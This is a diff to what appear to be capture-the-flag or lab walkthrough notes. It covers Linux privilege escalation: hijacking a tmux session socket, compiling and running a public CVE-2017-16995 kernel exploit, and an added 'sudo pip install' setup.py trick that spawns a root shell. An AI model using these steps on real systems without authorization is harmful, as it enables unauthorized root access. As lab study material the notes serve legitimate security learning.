@@ -20,12 +20,19 @@
 
 
 ## Privilage Esc. 1
-1. `/usr/bin/tmux -S /.dev/session`
+1. `export TMUX=/.dev/session,1234,0`
+2. `tmux`
 ## Priv Esc. 2
 1. https://github.com/gugronnier/CVE-2017-16995/blob/master/exploit-poc-pentest.c
 2. `gcc --static exploit-poc-pentest.c -o exploit-poc-pentest` and upload it
 3. `chmod +x ./exploit-poc-pentest`
 4. `./exploit-poc-pentest`
+## Alex Priv. Esc.
+```bash
+TF=$(mktemp -d)
+echo "import pty; pty.spawn('/bin/bash')" > $TF/setup.py
+sudo pip install $TF
+```
 ## Flags
 	cat /home/gloria/user.txt
 	cat /home/marty/user.txt (Reversed)
